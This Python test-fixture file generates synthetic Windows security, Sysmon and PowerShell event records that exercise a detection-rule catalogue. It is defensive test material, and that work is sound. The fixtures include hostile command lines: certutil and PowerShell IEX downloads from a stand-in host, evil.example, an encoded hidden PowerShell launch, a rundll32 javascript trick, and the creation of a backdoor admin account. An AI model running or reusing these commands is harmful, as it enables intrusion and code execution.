"""
Positive samples for every bundled Windows rule, written as real EVTX
EventData / UserData and pushed through the parser's flatten() so the field
mapping is validated too. Used by tests/backend/test_rule_catalogue.py and,
exported as JSON, by the frontend engine tests.

    .venv\\Scripts\\python.exe samples\\synthetic\\rule_samples.py   # writes frontend/src/rules/rule_samples.json
"""
from __future__ import annotations

import json
import sys
from pathlib import Path
from typing import Any

sys.path.insert(0, "backend")
from services.parsers.evtx_parser import flatten  # noqa: E402

SEC = ("Microsoft-Windows-Security-Auditing", "Security")
SYSMON = ("Microsoft-Windows-Sysmon", "Microsoft-Windows-Sysmon/Operational")
PS = ("Microsoft-Windows-PowerShell", "Microsoft-Windows-PowerShell/Operational")
SCM = ("Service Control Manager", "System")
# reference times (UTC). Business hours in the tests: 08-19 Europe/Paris, weekend Sat/Sun.
DAY = 1788300000000  # 2026-09-01 (Tuesday) 21:20 UTC
T_WORK = 1788255000000  # 2026-09-01 08:50 UTC = 10:50 Paris
T_NIGHT = 1788226200000  # 2026-09-01 00:50 UTC = 02:50 Paris
T_SUNDAY = 1788080000000  # 2026-08-30 (Sunday) 08:13 UTC
_rec = [1000]


def ev(event_id: int, prov: tuple[str, str], data: dict[str, Any], ts: int = T_WORK, computer: str = "WS01", user_data: dict[str, Any] | None = None) -> dict[str, Any]:
    _rec[0] += 1
    iso = __import__("datetime").datetime.fromtimestamp(ts / 1000, tz=__import__("datetime").timezone.utc).isoformat(timespec="microseconds").replace("+00:00", "Z")
    event: dict[str, Any] = {
        "Event": {
            "System": {
                "Provider": {"#attributes": {"Name": prov[0], "Guid": "{54849625-5478-4994-A5BA-3E3B0328C30D}"}},
                "EventID": event_id, "Version": 2, "Level": 0, "Task": 0, "Opcode": 0, "Keywords": "0x8020000000000000",
                "TimeCreated": {"#attributes": {"SystemTime": iso}}, "EventRecordID": _rec[0],
                "Execution": {"#attributes": {"ProcessID": 720, "ThreadID": 1}}, "Channel": prov[1], "Computer": computer,
                "Security": {"#attributes": {"UserID": "S-1-5-18"}},
            },
        }
    }
    if user_data is not None:
        event["Event"]["UserData"] = user_data
    else:
        event["Event"]["EventData"] = data
    return flatten(event, None, include_raw=True)


def logon_fail(ip: str, user: str, ts: int, sub: str = "0xc000006a", lt: int = 3) -> dict[str, Any]:
    return ev(4625, SEC, {"SubjectUserSid": "S-1-0-0", "SubjectUserName": "-", "TargetUserName": user, "TargetDomainName": "CORP", "Status": "0xc000006d",
                          "SubStatus": sub, "LogonType": lt, "IpAddress": ip, "IpPort": 4444, "WorkstationName": "KALI", "AuthenticationPackageName": "NTLM"}, ts)


def logon_ok(ip: str, user: str, ts: int, lt: int = 3, auth: str = "Kerberos", extra: dict[str, Any] | None = None) -> dict[str, Any]:
    d = {"TargetUserName": user, "TargetDomainName": "CORP", "TargetLogonId": "0x3e7", "LogonType": lt, "IpAddress": ip, "IpPort": 50000,
         "WorkstationName": "WS02", "AuthenticationPackageName": auth, "LogonProcessName": "Kerberos" if auth == "Kerberos" else "NtLmSsp", "KeyLength": 128,
         "SubjectUserName": "-", "ElevatedToken": "%%1843"}
    d.update(extra or {})
    return ev(4624, SEC, d, ts)


def proc(image: str, cmd: str, parent: str = "C:\\Windows\\explorer.exe", user: str = "alice", ts: int = T_WORK) -> dict[str, Any]:
    return ev(4688, SEC, {"SubjectUserName": user, "SubjectDomainName": "CORP", "NewProcessName": image, "NewProcessId": "0x1234", "CommandLine": cmd,
                          "ParentProcessName": parent, "TokenElevationType": "%%1938", "MandatoryLabel": "S-1-16-8192"}, ts)


def sysmon(event_id: int, data: dict[str, Any], ts: int = T_WORK) -> dict[str, Any]:
    base = {"UtcTime": "2026-09-01 08:50:00.000", "ProcessGuid": "{00000000-0000-0000-0000-000000000001}", "ProcessId": 4321, "User": "CORP\\alice", "RuleName": "-"}
    base.update(data)
    return ev(event_id, SYSMON, base, ts)


def build() -> list[dict[str, Any]]:
    """A small host scenario touching most bundled Windows rules: a brute force that succeeds, an
    off-hours admin logon, a weekend service-account logon, download and execution tooling, a
    Sysmon process / network / DNS / file chain, a log clear, a service install, account and group
    changes and an encoded PowerShell script block. Also the event half of the engine parity fixture."""
    t = T_WORK
    rows: list[dict[str, Any]] = []
    for i in range(12):
        rows.append(logon_fail("203.0.113.9", "alice", t + i * 5000))
    rows.append(logon_ok("203.0.113.9", "alice", t + 70_000, lt=10))
    rows.append(logon_ok("198.51.100.7", "administrator", T_NIGHT, lt=10, auth="NTLM"))
    rows.append(logon_ok("10.0.0.5", "svc_backup", T_SUNDAY, lt=3))
    rows.append(proc(r"C:\Windows\System32\certutil.exe", "certutil.exe -urlcache -split -f http://evil.example/a.exe C:\\Users\\Public\\a.exe", parent=r"C:\Windows\System32\cmd.exe", ts=t + 90_000))
    rows.append(proc(r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", "powershell -nop -w hidden -enc SQBFAFgA", parent=r"C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE", ts=t + 95_000))
    rows.append(proc(r"C:\Windows\notepad.exe", "notepad.exe", ts=t + 96_000))
    rows.append(sysmon(1, {"Image": r"C:\Windows\System32\rundll32.exe", "CommandLine": 'rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication"', "ParentImage": r"C:\Windows\System32\cmd.exe", "OriginalFileName": "RUNDLL32.EXE"}, ts=t + 100_000))
    rows.append(sysmon(3, {"Image": r"C:\Windows\System32\rundll32.exe", "DestinationIp": "203.0.113.66", "DestinationPort": 4444, "Protocol": "tcp", "Initiated": "true"}, ts=t + 101_000))
    rows.append(sysmon(22, {"Image": r"C:\Windows\System32\rundll32.exe", "QueryName": "evil-login.net", "QueryResults": "::ffff:203.0.113.66;"}, ts=t + 102_000))
    rows.append(sysmon(11, {"Image": r"C:\Windows\explorer.exe", "TargetFilename": r"C:\Users\alice\Downloads\invoice.pdf.exe"}, ts=t + 103_000))
    rows.append(ev(1102, ("Microsoft-Windows-Eventlog", "Security"), {}, ts=t + 110_000, user_data={"LogFileCleared": {"SubjectUserName": "alice", "SubjectDomainName": "CORP"}}))
    rows.append(ev(7045, SCM, {"ServiceName": "Updater", "ImagePath": r"C:\Users\Public\svc.exe", "ServiceType": "user mode service", "StartType": "auto start", "AccountName": "LocalSystem"}, ts=t + 120_000))
    rows.append(ev(4720, SEC, {"TargetUserName": "backdoor", "SubjectUserName": "alice", "SubjectDomainName": "CORP"}, ts=t + 130_000))
    rows.append(ev(4732, SEC, {"MemberName": "CN=backdoor,CN=Users,DC=corp", "TargetUserName": "Administrators", "SubjectUserName": "alice"}, ts=t + 131_000))
    rows.append(ev(4104, PS, {"ScriptBlockText": "IEX (New-Object Net.WebClient).DownloadString('http://evil.example/p.ps1')", "Path": ""}, ts=t + 140_000))
    return rows


if __name__ == "__main__":
    out = Path("frontend/src/rules/rule_samples.json")
    out.write_text(json.dumps(build(), default=str), encoding="utf-8")
    print(f"{len(build())} sample events written to {out}")
